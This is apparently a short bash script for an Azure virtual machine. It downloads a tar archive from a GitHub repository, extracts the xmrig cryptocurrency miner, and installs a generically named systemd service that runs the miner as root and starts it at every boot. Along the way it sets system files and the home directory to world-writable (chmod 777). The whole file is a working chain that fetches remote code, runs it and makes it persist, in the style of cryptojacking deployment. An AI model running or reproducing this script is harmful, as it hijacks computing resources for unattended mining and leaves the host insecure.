#!/bin/bash
sleep 10 ;
sudo touch /etc/systemd/system/script.service ;
sudo touch /usr/local/bin/script.sh ;
sudo chmod 777 /etc/systemd/system/script.service ;
sudo chmod 777 /usr/local/bin/script.sh ;
sudo apt update ;
cd /home/azureuser/ ;
wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar ;
sudo chmod 777 /home/azureuser/* ;
sudo tar xvf output_filename.tar ;
sudo chmod 777 /home/azureuser/* ;
sleep 3 ;
sudo chmod +x xmrig ;

echo "#!/bin/bash
./xmrig" | sudo tee /usr/local/bin/script.sh > /dev/null

echo "[Unit]
Description=Script
After=network.target
[Service]
ExecStart=/usr/local/bin/script.sh
Type=simple
Restart=no
User=root
WorkingDirectory=/home/azureuser/
[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/script.service > /dev/null

sudo systemctl daemon-reload ;
sudo systemctl start script.service ;
sudo systemctl enable script.service ;
